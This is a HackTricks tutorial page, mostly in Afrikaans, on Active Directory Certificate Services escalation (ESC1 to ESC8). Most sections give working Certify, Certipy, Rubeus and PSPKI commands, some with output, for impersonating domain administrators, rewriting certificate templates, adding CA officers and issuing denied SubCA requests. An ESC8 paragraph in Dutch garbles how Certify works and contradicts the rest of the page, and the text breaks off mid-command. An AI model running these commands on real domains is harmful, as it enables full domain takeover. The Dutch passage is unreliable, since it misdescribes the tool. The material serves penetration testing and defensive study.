# AD CS Domein Eskalasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

**Hierdie is 'n opsomming van die eskalasietegniek-afdelings van die plasings:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd gekonfigureerde Sertifikaatsjablone - ESC1

### Verduideliking

### Verkeerd gekonfigureerde Sertifikaatsjablone - ESC1 Verduidelik

* **Inskrywingsregte word aan laagbevoegde gebruikers verleen deur die Enterprise CA.**
* **Goedkeuring deur bestuur is nie nodig nie.**
* **Geen handtekeninge van gemagtigde personeel is nodig nie.**
* **Sekuriteitsbeskrywers op sertifikaatsjablone is oormatig toegeeflik, wat laagbevoegde gebruikers in staat stel om inskrywingsregte te verkry.**
* **Sertifikaatsjablone is gekonfigureer om EKUs te definieer wat outentisering fasiliteer:**
* Uitgebreide Sleutelgebruik (EKU)-identifiseerders soos Kliëntoutentisering (OID 1.3.6.1.5.5.7.3.2), PKINIT Kliëntoutentisering (1.3.6.1.5.2.3.4), Slimkaart Aanteken (OID 1.3.6.1.4.1.311.20.2.2), Enige Doel (OID 2.5.29.37.0), of geen EKU (SubCA) is ingesluit.
* **Die vermoë vir versoekers om 'n subjectAltName in die Sertifikaatondertekeningversoek (CSR) in te sluit, word deur die sjabloon toegelaat:**
* Die Aktiewe Gids (AD) gee prioriteit aan die subjectAltName (SAN) in 'n sertifikaat vir identiteitsverifikasie indien dit teenwoordig is. Dit beteken dat deur die SAN in 'n CSR te spesifiseer, 'n sertifikaat aangevra kan word om enige gebruiker te impersoneer (bv. 'n domeinadministrateur). Of 'n SAN deur die versoeker gespesifiseer kan word, word aangedui in die AD-voorwerp van die sertifikaatsjabloon deur die `mspki-certificate-name-flag`-eienskap. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-vlag maak die spesifikasie van die SAN deur die versoeker moontlik.

{% hint style="danger" %}
Die gekonfigureerde instelling maak dit vir laagbevoegde gebruikers moontlik om sertifikate met enige SAN van keuse aan te vra, wat outentisering as enige domeinprinsipaal deur Kerberos of SChannel moontlik maak.
{% endhint %}

Hierdie funksie word soms geaktiveer om die vinnige generering van HTTPS- of gasheersertifikate deur produkte of implementeringsdienste te ondersteun, of as gevolg van 'n gebrek aan begrip.

Dit moet opgemerk word dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing veroorsaak, wat nie die geval is wanneer 'n bestaande sertifikaatsjabloon (soos die `WebServer`-sjabloon, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer word en dan gewysig word om 'n outentiserings-OID in te sluit.

### Misbruik

Om **kwesbare sertifikaatsjablone te vind**, kan jy die volgende uitvoer:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om van hierdie kwesbaarheid misbruik te maak om as 'n administrateur op te tree, kan 'n persoon die volgende uitvoer:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`-formaat omskep** en dit weer gebruik om **te verifieer met behulp van Rubeus of certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows binêre lêers "Certreq.exe" & "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die opname van sertifikaatsjablone binne die AD Forest se konfigurasieskema, spesifiek dié wat nie goedkeuring of handtekeninge vereis nie, wat 'n Kliëntverifikasie of Slimkaart Aanteken EKU besit, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag geaktiveer, kan uitgevoer word deur die volgende LDAP-navraag te hardloop:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misgekonfigureerde Sertifikaat Templaat - ESC2

### Verduideliking

Die tweede misbruik scenario is 'n variasie van die eerste een:

1. Inskrywingsregte word deur die Enterprise CA aan lae-bevoorregte gebruikers verleen.
2. Die vereiste vir bestuurder goedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. 'n Oormatig toegeeflike sekuriteitsbeskrywer op die sertifikaat templaat verleen sertifikaat inskrywingsregte aan lae-bevoorregte gebruikers.
5. **Die sertifikaat templaat is gedefinieer om die Any Purpose EKU of geen EKU in te sluit.**

Die **Any Purpose EKU** maak dit moontlik vir 'n aanvaller om 'n sertifikaat te verkry vir **enige doel**, insluitend kliënt outentifikasie, bediener outentifikasie, kodes ondertekening, ens. Dieselfde **tegniek wat gebruik word vir ESC3** kan gebruik word om van hierdie scenario misbruik te maak.

Sertifikate sonder **EKUs**, wat as ondergeskikte CA sertifikate optree, kan misbruik word vir **enige doel** en kan **ook gebruik word om nuwe sertifikate te onderteken**. Dus kan 'n aanvaller arbitrêre EKUs of velde spesifiseer in die nuwe sertifikate deur gebruik te maak van 'n ondergeskikte CA sertifikaat.

Tog sal nuwe sertifikate wat vir **domein outentifikasie** geskep word nie funksioneer as die ondergeskikte CA nie vertrou word deur die **`NTAuthCertificates`** objek nie, wat die verstek instelling is. Nietemin kan 'n aanvaller steeds **nuwe sertifikate met enige EKU** en arbitrêre sertifikaatwaardes skep. Hierdie sertifikate kan potensieel **misbruik** word vir 'n wye verskeidenheid doeleindes (bv. kodes ondertekening, bediener outentifikasie, ens.) en kan beduidende implikasies hê vir ander toepassings in die netwerk soos SAML, AD FS, of IPSec.

Om templaat wat by hierdie scenario pas binne die AD Forest se konfigurasie skema op te som, kan die volgende LDAP navraag uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misgekonfigureerde Registrasie-Agent-sjablone - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede een, maar **misbruik** 'n **verskillende EKU** (Sertifikaatversoekagent) en **2 verskillende sjablone** (daarom het dit 2 stelle vereistes).

Die **Sertifikaatversoekagent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekend as **Registrasie-Agent** in Microsoft-dokumentasie, stel 'n hoof in staat om 'n **sertifikaat** te **registreer namens 'n ander gebruiker**.

Die **"registrasie-agent"** registreer in so 'n **sjabloon** en gebruik die resulterende **sertifikaat om 'n CSR saam met die ander gebruiker te onderteken**. Dit **stuur** dan die **saamondertekende CSR** na die CA, registreer in 'n **sjabloon** wat **"registreer namens" toelaat**, en die CA reageer met 'n **sertifikaat wat aan die "ander" gebruiker behoort**.

**Vereistes 1:**

- Registrasie-regte word aan laagbevoorregte gebruikers verleen deur die Enterprise CA.
- Die vereiste vir bestuursgoedkeuring word weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsbeskrywer van die sertifikaatsjabloon is buitensporig toegeeflik en verleen registrasie-regte aan laagbevoorregte gebruikers.
- Die sertifikaatsjabloon sluit die Sertifikaatversoekagent EKU in, wat die versoek van ander sertifikaatsjablone namens ander hoofde moontlik maak.

**Vereistes 2:**

- Die Enterprise CA verleen registrasie-regte aan laagbevoorregte gebruikers.
- Bestuursgoedkeuring word omseil.
- Die sjabloon se skemas weergawe is óf 1 óf oorskry 2, en dit spesifiseer 'n Toepassingsbeleid Uitreikingsvereiste wat die Sertifikaatversoekagent EKU vereis.
- 'n EKU wat in die sertifikaatsjabloon gedefinieer is, maak domeinverifikasie moontlik.
- Beperkings vir registrasie-agente word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om van hierdie scenario misbruik te maak:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om 'n **enrollment agent sertifikaat** te **verkry**, die sjablone waarin enrollment **agents** toegelaat word om in te skryf, en die **rekeninge** namens wie die enrollment agent kan optree, kan beperk word deur ondernemings-CA's. Dit word bereik deur die `certsrc.msc` **snap-in** oop te maak, **regs te klik op die CA**, **Eienskappe** te kies, en dan na die "Enrollment Agents" oortjie te **navigeer**.

Dit moet egter opgemerk word dat die **verstek** instelling vir CA's is om "Enrollment agents nie te beperk nie." Wanneer die beperking op enrollment agents deur administrateurs geaktiveer word, en dit op "Beperk enrollment agents" ingestel word, bly die verstek konfigurasie uiters inskiklik. Dit laat **Almal** toe om in te skryf vir alle sjablone as enigiemand.

## Kwesbare Sertifikaatsjabloon Toegangbeheer - ESC4

### **Verduideliking**

Die **sekuriteitsbeskrywing** op **sertifikaatsjablone** definieer die **toestemmings** wat spesifieke **AD-beginsels** het ten opsigte van die sjabloon.

Indien 'n **aanvaller** die nodige **toestemmings** het om 'n **sjabloon** te **verander** en enige **uitbuitbare misconfigurations** wat in **vorige afdelings** uitgelig is, te **implementeer**, kan voorregverhoging gefasiliteer word.

Bekende toestemmings wat van toepassing is op sertifikaatsjablone sluit in:

- **Eienaar:** Verleen implisiete beheer oor die objek, wat die verandering van enige eienskappe moontlik maak.
- **VolleBeheer:** Gee volle gesag oor die objek, insluitend die vermoë om enige eienskappe te verander.
- **SkryfEienaar:** Maak die verandering van die eienaar van die objek moontlik na 'n beginsel onder die aanvaller se beheer.
- **SkryfDacl:** Maak die aanpassing van toegangskontroles moontlik, wat 'n aanvaller VolleBeheer kan gee.
- **SkryfEienskap:** Mag die wysiging van enige objekteienskappe goedkeur.

### Misbruik

'n Voorbeeld van 'n voorregverhoging soos die vorige een:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfregte het oor 'n sertifikaatsjabloon. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaatsjabloon te oorskryf om die sjabloon kwesbaar te maak vir ESC1.

Soos ons kan sien in die bogenoemde pad, het slegs `JOHNPC` hierdie regte, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` skakel na `JOHNPC`. Aangesien hierdie tegniek verband hou met sertifikate, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n klein voorskou van Certipy se `shadow auto` bevel om die NT-hash van die slagoffer te bekom.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van 'n sertifikaatsjabloon met 'n enkele opdrag oorskryf. Standaard sal Certipy die konfigurasie oorskryf om dit vatbaar te maak vir ESC1. Ons kan ook die `-save-old` parameter spesifiseer om die ou konfigurasie te stoor, wat nuttig sal wees vir die herstel van die konfigurasie na ons aanval.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwesbare PKI-voorwerpstoegangsbeheer - ESC5

### Verduideliking

Die uitgebreide web van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie voorwerpe insluit buite sertifikaatsjablone en die sertifikaatautoriteit, kan die veiligheid van die hele AD CS-stelsel beïnvloed. Hierdie voorwerpe, wat 'n beduidende impak op veiligheid kan hê, sluit in:

* Die AD-rekenaarvoorwerp van die CA-bediener, wat deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
* Die RPC/DCOM-bediener van die CA-bediener.
* Enige afstammeling AD-voorwerp of houer binne die spesifieke houerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit houers en voorwerpe soos die Sertifikaatsjablone-houer, Sertifiseringsowerhede-houer, die NTAuthCertificates-voorwerp en die Inschrywingsdienshouer in.

Die veiligheid van die PKI-stelsel kan gekompromitteer word as 'n laagbevoorregte aanvaller beheer oor enige van hierdie kritieke komponente verkry.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat bespreek word in die [**CQure Academy-pos**](https://cqureacademy.com/blog/enhanced-key-usage) raak ook die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag aan, soos deur Microsoft uiteengesit. Hierdie konfigurasie, wanneer dit geaktiveer word op 'n Sertifiseringsowerheid (CA), maak die insluiting van **gebruiker-gedefinieerde waardes** in die **alternatiewe naam van die onderwerp** vir **enige versoek** moontlik, insluitend dié wat vanuit Active Directory® saamgestel is. Gevolglik maak hierdie bepaling dit moontlik vir 'n **indringer** om in te skryf deur **enige sjabloon** wat opgestel is vir domein **outentisering**—veral dié wat oop is vir **onbevoorregte** gebruikers se inskrywing, soos die standaard Gebruikersjabloon. As gevolg hiervan kan 'n sertifikaat verkry word wat die indringer in staat stel om as 'n domein-administrateur of **enige ander aktiewe entiteit** binne die domein te outentiseer.

**Nota**: Die benadering om **alternatiewe name** by 'n Sertifikaatondertekeningversoek (CSR) te voeg, deur die `-attrib "SAN:"` argument in `certreq.exe` (bekend as "Naamwaardepare"), verskil van die uitbuitingsstrategie van SAN's in ESC1. Hier lê die verskil in **hoe rekeninginligting gekapsuleer word**—binne 'n sertifikaateienskap, eerder as 'n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie operasie maak gebruik van **afstandsbediening registertoegang**, dus 'n alternatiewe benadering kan wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Hulpmiddels soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie verkeerde konfigurasie op te spoor en te misbruik:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te verander, onder die aanname dat 'n persoon **domeinadministratiewe** regte of ekwivalent besit, kan die volgende opdrag uitgevoer word vanaf enige werkstasie:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing uit te skakel, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Na die Mei 2022 sekuriteitsopdaterings, sal nuut uitgereikte **sertifikate** 'n **sekuriteitsuitbreiding** bevat wat die **versoeker se `objectSid` eienskap** inkorporeer. Vir ESC1 word hierdie SID afgelei van die gespesifiseerde SAN. Vir **ESC6** weerspieël die SID egter die **versoeker se `objectSid`**, nie die SAN nie.\
Om ESC6 uit te buit, is dit noodsaaklik dat die stelsel vatbaar is vir ESC10 (Swak Sertifikaatkarterings), wat die **SAN bo die nuwe sekuriteitsuitbreiding** prioriteer.
{% endhint %}

## Kwesbare Sertifikaatowerheid Toegangsbeheer - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir 'n sertifikaatowerheid word deur 'n stel toestemmings onderhou wat CA-aksies beheer. Hierdie toestemmings kan besigtig word deur `certsrv.msc` te open, regs te klik op 'n CA, eienskappe te kies en dan na die Sekuriteit-vlak te navigeer. Daarbenewens kan toestemmings opgesom word deur die PSPKI-module te gebruik met opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hierdie bied insigte in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat ooreenstem met die rolle van "CA-administrator" en "Sertifikaatbestuurder" onderskeidelik.

#### Misbruik

Die besit van **`ManageCA`** regte op 'n sertifikaatautoriteit stel die hoof in staat om instellings op afstand te manipuleer deur gebruik te maak van PSPKI. Dit sluit in die skakeling van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag om SAN-spesifikasie in enige sjabloon toe te laat, 'n kritieke aspek van domein-escalasie.

Vereenvoudiging van hierdie proses is moontlik deur die gebruik van die PSPKI se **Enable-PolicyModuleFlag** cmdlet, wat wysigings sonder direkte GUI-interaksie toelaat.

Die besit van **`ManageCertificates`** regte fasiliteer die goedkeuring van hangende versoeke, wat die "CA-sertifikaatbestuurder-goedkeuring" veiligheidsmaatreël omseil.

'n Kombinasie van die **Certify** en **PSPKI** modules kan gebruik word om 'n sertifikaat aan te vra, goed te keur, en af te laai:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

{% hint style="warning" %}
In die **vorige aanval** is **`Manage CA`-regte** gebruik om die **EDITF\_ATTRIBUTESUBJECTALTNAME2**-vlag te **aktiveer** om die **ESC6-aanval** uit te voer, maar dit sal geen effek hê totdat die CA-diens (`CertSvc`) herlaai word nie. Wanneer 'n gebruiker die `Manage CA`-toegangsreg het, word die gebruiker ook toegelaat om die diens te **herlaai**. Dit beteken egter nie dat die gebruiker die diens op afstand kan herlaai nie. Verder mag ESC6 nie outomaties werk in die meeste opgedateerde omgewings nie as gevolg van die veiligheidsopdaterings van Mei 2022.
{% endhint %}

Daarom word 'n ander aanval hier voorgestel.

Vereistes:

* Slegs **`ManageCA`-regte**
* **`Manage Certificates`-regte** (kan vanaf **`ManageCA`** toegeken word)
* Sertifikaatsjabloon **`SubCA`** moet **geaktiveer** wees (kan vanaf **`ManageCA`** geaktiveer word)

Die tegniek berus op die feit dat gebruikers met die `Manage CA`-_en_ `Manage Certificates`-toegangsreg die reg het om **mislukte sertifikaatversoeke** uit te reik. Die **`SubCA`**-sertifikaatsjabloon is **kwesbaar vir ESC1**, maar **slegs administrateurs** kan inskryf vir die sjabloon. Dus kan 'n **gebruiker** versoek om in te skryf vir die **`SubCA`** - wat **geweier** sal word - maar **daarna deur die bestuurder uitgereik** sal word.

#### Misbruik

Jy kan jouself die **`Manage Certificates`-toegangsreg** toeken deur jou gebruiker as 'n nuwe beampte by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** sjabloon kan **geaktiveer word op die CA** met die `-enable-template` parameter. Standaard is die `SubCA` sjabloon geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
As ons aan die voorvereistes vir hierdie aanval voldoen het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA` templaat**.

**Hierdie versoek sal afgekeur word**, maar ons sal die privaat sleutel stoor en die versoek-ID aanteken.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Beheer CA` en `Beheer Sertifikate`**, kan ons dan die **mislukte sertifikaat versoek uitreik** met die `ca` bevel en die `-issue-request <versoek ID>` parameter.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En uiteindelik kan ons die uitgereikte sertifikaat **herwin** met die `req` bevel en die `-retrieve <versoek ID>` parameter.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay na AD CS HTTP-eindpunte - ESC8

### Verduideliking

{% hint style="info" %}
In omgewings waar **AD CS geïnstalleer** is, as 'n **web-enrollering-eindpunt kwesbaar** bestaan en ten minste een **sertifikaatsjabloon gepubliseer** is wat **domeinrekenaar-inskrywing en kliëntverifikasie toelaat** (soos die verstek **`Machine`**-sjabloon), word dit moontlik vir **enige rekenaar met die spooler-diens aktief om deur 'n aanvaller gekompromitteer te word**!
{% endhint %}

Verskeie **HTTP-gebaseerde inskrywingsmetodes** word ondersteun deur AD CS, beskikbaar deur bykomende bedienerrolle wat administrateurs kan installeer. Hierdie koppelvlakke vir HTTP-gebaseerde sertifikaatinskrywing is vatbaar vir **NTLM-relay-aanvalle**. 'n Aanvaller kan vanaf 'n **gekompromitteerde masjien enige AD-rekening naboots** wat inkomende NTLM-verifikasie gebruik. Terwyl die slagofferrekening nageboots word, kan 'n aanvaller hierdie webkoppelvlakke gebruik om 'n kliëntverifikasiesertifikaat aan te vra deur die `User` of `Machine`-sertifikaatsjablone.

* Die **web-enrolleringkoppelvlak** ( 'n ouer ASP-toepassing beskikbaar by `http://<caserver>/certsrv/`), verstek na slegs HTTP, wat nie beskerming teen NTLM-relay-aanvalle bied nie. Daarbenewens staan dit slegs NTLM-verifikasie toe deur sy Autorisasie-HTTP-kop, wat meer veilige verifikasiemetodes soos Kerberos onbruikbaar maak.
* Die **Sertifikaatinskrywingsdiens** (CES), **Sertifikaatinskrywingsbeleid** (CEP) Webdiens, en **Netwerktoestelinskrywingsdiens** (NDES) ondersteun standaard onderhandelingsverifikasie via hul Autorisasie-HTTP-kop. Onderhandelingsverifikasie **ondersteun beide** Kerberos en **NTLM**, wat 'n aanvaller in staat stel om af te gradeer na NTLM-verifikasie tydens relay-aanvalle. Alhoewel hierdie webdienste standaard HTTPS ondersteun, bied HTTPS alleenlik **nie beskerming teen NTLM-relay-aanvalle nie**. Beskerming teen NTLM-relay-aanvalle vir HTTPS-dienste is slegs moontlik wanneer HTTPS gekombineer word met kanaalbinding. Ongelukkig aktiveer AD CS nie Uitgebreide Beskerming vir Verifikasie op IIS nie, wat vereis word vir kanaalbinding.

'n Algemene **probleem** met NTLM-relay-aanvalle is die **kort duur van NTLM-sessies** en die onvermoë van die aanvaller om met dienste te kommunikeer wat **NTLM-ondertekening vereis**.

Hierdie beperking word egter oorkom deur 'n NTLM-relay-aanval te benut om 'n sertifikaat vir die gebruiker te verkry, aangesien die geldigheidsperiode van die sertifikaat die duur van die sessie bepaal, en die sertifikaat gebruik kan word met dienste wat **NTLM-ondertekening voorskryf**. Vir instruksies oor die gebruik van 'n gesteelde sertifikaat, verwys na:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

'n Ander beperking van NTLM-relay-aanvalle is dat **'n aanvallerbeheerde masjien deur 'n slagofferrekening geïdentifiseer moet word**. Die aanvaller kan óf wag óf probeer om hierdie verifikasie **af te dwing**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` tel **geaktiveerde HTTP AD CS-eindpunte** op:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers` eiendom word deur ondernemingsertifikaatautoriteite (CA's) gebruik om Sertifikaatinskrywingsdiens (CES) eindpunte te stoor. Hierdie eindpunte kan geparseer en gelys word deur die hulpmiddel **Certutil.exe** te gebruik:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Misbruik met Certify

Certify is een open-source tool die wordt gebruikt voor het beheren van certificaten op Windows-systemen. Het kan echter ook worden misbruikt om bevoorrechte toegang te verkrijgen in een Active Directory (AD) omgeving.

De eerste stap is om Certify te installeren en te configureren op een Windows-machine die lid is van het domein. Vervolgens moet je een certificaat aanmaken en dit certificaat importeren in de AD-omgeving. Dit kan worden gedaan met behulp van de Certify-interface of via de command line.

Zodra het certificaat is geïmporteerd, kan het worden gebruikt om bevoorrechte toegang te verkrijgen. Dit kan worden gedaan door het certificaat toe te voegen aan de groep "Domain Admins" of een andere groep met bevoorrechte toegang. Hierdoor krijgt de gebruiker die het certificaat bezit dezelfde rechten als de leden van de groep.

Het misbruik van Certify kan leiden tot domeinescalatie en volledige controle over het AD-domein. Het is daarom belangrijk om de toegang tot Certify te beperken en ervoor te zorgen dat alleen vertrouwde gebruikers toegang hebben tot de tool.

Om misbruik met Certify te voorkomen, is het ook belangrijk om regelmatig de beveiligingsinstellingen van het AD-domein te controleren en bij te werken. Dit omvat het controleren van de groepen met bevoorrechte toegang en het verwijderen van onnodige certificaten.

Het is ook aan te raden om monitoringtools te gebruiken om verdachte activiteiten in het AD-domein te detecteren. Dit kan helpen bij het identificeren van mogelijke misbruikpogingen en het nemen van passende maatregelen om de beveiliging te versterken.

Door bewust te zijn van de risico's en het nemen van de juiste maatregelen, kan het misbruik van Certify worden voorkomen en kan de beveiliging van het AD-domein worden versterkt.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
